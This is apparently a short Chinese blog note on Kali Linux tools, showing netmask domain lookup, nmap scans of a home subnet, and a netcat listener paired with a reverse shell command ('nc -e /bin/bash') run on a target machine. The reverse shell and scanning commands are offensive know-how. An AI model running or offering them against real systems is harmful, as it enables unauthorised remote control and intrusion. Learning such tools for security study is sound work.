---
title: "Kali Linux 工具"
date: 2022-09-14T15:04:29+08:00
draft: false
tags: ["Linux","Hacker"]
categories: ["Linux"]
resources:
- name: "featured-image"
  src: "banner.png"
---

## netmask

### 查域名ip

```bash
netmask -s google.com
```

## nmap 端口扫描

### 扫描网段下的ip

查看路由器连接了那些设备

```bash
#指定端口范围
nmap -sT -p 80,443  192.168.31.0/24
nmap -sT   192.168.31.0/24
```

### 扫描端口

```bash
nmap 192.168.31.26
```

## netcat 使用

### 在源机器建立监听

```bash
nc -lnvp 88 -s 192.168.31.191
```

### 在目标机器连接源机器

```bash
nc -e /bin/bash 192.168.31.191 88
```

回到源机器，可以看到如下回显

```bash
connect to [192.168.31.191] from (UNKNOWN) [192.168.31.26] 64197
```
在源机器上执行命令，现在就可以像操作本机一样操作目标机器